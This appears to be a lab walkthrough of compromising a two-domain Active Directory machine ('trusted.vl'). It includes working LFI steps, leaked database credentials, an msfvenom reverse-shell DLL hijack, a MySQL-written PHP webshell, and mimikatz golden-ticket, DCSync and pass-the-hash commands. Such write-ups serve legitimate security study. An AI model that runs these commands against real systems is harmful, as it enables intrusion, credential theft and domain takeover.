# Enumeration
1.
```
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-09 14:07:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=trusteddc.trusted.vl
| Not valid before: 2024-04-08T14:01:07
|_Not valid after:  2024-10-08T14:01:07
|_ssl-date: 2024-04-09T14:08:09+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TRUSTED
|   NetBIOS_Domain_Name: TRUSTED
|   NetBIOS_Computer_Name: TRUSTEDDC
|   DNS_Domain_Name: trusted.vl
|   DNS_Computer_Name: trusteddc.trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-09T14:08:01+00:00
Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

2.
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.10.187.70/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-09 14:08:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6)
| http-title: Welcome to XAMPP
|_Requested resource was https://10.10.187.70/dashboard/
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, ODBCClient, InteractiveClient, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, SupportsTransactions, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: zu\KEXi*0U9^LABf\{uY
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-04-09T14:08:29+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LAB
|   NetBIOS_Domain_Name: LAB
|   NetBIOS_Computer_Name: LABDC
|   DNS_Domain_Name: lab.trusted.vl
|   DNS_Computer_Name: labdc.lab.trusted.vl
|   DNS_Tree_Name: trusted.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-04-09T14:08:21+00:00
| ssl-cert: Subject: commonName=labdc.lab.trusted.vl
| Not valid before: 2024-04-08T14:01:07
|_Not valid after:  2024-10-08T14:01:07
Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

There is an apache website on trusted.vl:
![](attachment/80754b8f832f586189d4671ba63f4eb9.png)

Using gobuster to fuzz directories:
![](attachment/5f2ffad7c9b05527e6f2a92a10392733.png)
We discover a webpage at /dev:

![](attachment/352daacf9022d00bb3d90bee90ae4bf1.png)
Now testing for LFI:
![](attachment/3d45dd4a95aa90886ac9317cc2e4333a.png)
It works.

Checking index.html using php filters we get a base64. 
![](attachment/d223a8c9ffc8eb92c8128b22f7fbd482.png)
![](attachment/9d69d2b68393244a644a7238f81c3205.png)
Running gobuster for php extension we get a file called db.php.

Now using LFI:
![](attachment/2f569d04a10de32f0ea9a1a5ccf70de4.png)

Now logging in to mysql:
`mysql -u root -pSuperSecureMySQLPassw0rd1337. -h 10.10.225.134`

And checking the database `news`:
`select * from users;`
![](attachment/9f7923f16ee0e2e2a813f400771cd6ad.png)

The password is MD5 hash so cracking it:
![](attachment/2ff18744342a692c941c71acb29f43bb.png)![](attachment/135c9fa5ed5b415f61c50498dd748934.png)

Trying to use bloodhound.py it doesnt work and gives an error:
![](attachment/46ee2354346f4c1f466a4b8bf6c78be1.png)
Using dnschef:
`dnschef --fakeip 10.10.225.134`

Now using bloodhound.py:
`bloodhound.py -u 'rsmith' -p 'IHateEric2' -d lab.trusted.vl -dc labdc.lab.trusted.vl -c all -ns 127.0.0.1`
![](attachment/591160f47e9a8e693e7701485b001825.png)
Now we can change the password:
`net rpc password "EWALTERS" "aditya123@" -U "lab.trusted.vl"/"rsmith"%"IHateEric2" -S "labdc.lab.trusted.vl"`

Now we can use evil-winrm:
`evil-winrm -i labdc.lab.trusted.vl -u ewalters -p aditya123@`

Now checking the C drive there is an exe:
![](attachment/b8fe93bae5fcb8639fdf207898682204.png)

Now transfering to windows vm and using prcomon:
![](attachment/7a0dbcb2129b4062c374240951a9bc1e.png)
It is vulnerable to dll hijacking 

And the exe is 32 bit:![](attachment/e8533b7f108a5105afebf624f3ad8df7.png)

So creating a payload for missing dll:
`msfvenom -p windows/shell_reverse_tcp -f dll LHOST=10.8.1.208 LPORT=9005 > KasperskyRemovalToolENU.dll`
and uploading it in the respective place:

We get a shell
![](attachment/37580de589e1889efbabb29359c88a01.png)
## Alternate privesc
Using mysql upload a webshell to the web directory which we have access to where it is with phpinfo in the home page:
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/dev/shell.php';
```
Then access the page:
![](attachment/1295e841c3a77380391084c6b0319559.png)
Now we can upload rcat.exe and get a reverse shell back:
![](attachment/58bb3ac60c3c3ee1dd39f9278f6a1eff.png)

# Lateral Movement
From *adpeas* we know there is a parent child relation so:
Using mimikatz to dump hashes:
```
lsadump::trust /patch
```
![](attachment/2f55d99b4f31250b353244e615bcaf32.png)
Now using
```
Kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866-512 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /rc4:978eb8e52b460ee2d5a4979859214b10 /service:krbtgt /target:trusted.vl /ticket: C:\temp\trust.kirbi
```
Then using the ticket:
```
Rubeus.exe asktgs /ticket:C:\temp\ticket.kirbi /service:cifs/trusteddc.trusted.vl /dc:trusteddc.trusted.vl /ptt
```
Now we have tgs:
`export KRB5CCNAME=administrator.ccache`
`psexec.py administrator@trusteddc.trusted.vl -k -no-pass`

Now we can create a user and add to "Domain Admins" and "Enterprise Admins"
```
net user aditya P@ssw0rd /add /domain
```
```
net group "Enterprise Admins" /add aditya
net group "Domain Admins" /add aditya
```
Then enable logging in rdp with pth:
```
nxc smb trusted.vl -u Administrator -H 15db914be1e6a896e7692f608a9d72ef -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
Now we can rdp to the machine.
```
xfreerdp /u:administrator /pth:'15db914be1e6a896e7692f608a9d72ef' /cert:ignore /v:trusted.vl
```
To get administrator hash use `-ntds`  in nxc
Then get the hash:
![](attachment/02c28782f30c5eb26924b1c415f6f28a.png)
## [[ExtraSids]] Method
With mimikatz
```
kerberos::golden /user:Administrator /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```
```
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```
![](attachment/39316dbee92dbc26bef0a30023a0725d.png)
Now to enable rdp:
```
nxc smb trusted.vl -u Administrator -H 15db914be1e6a896e7692f608a9d72ef -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```
Then to login:
```
xfreerdp /u:administrator /pth:'15db914be1e6a896e7692f608a9d72ef' /cert:ignore /v:trusted.vl
```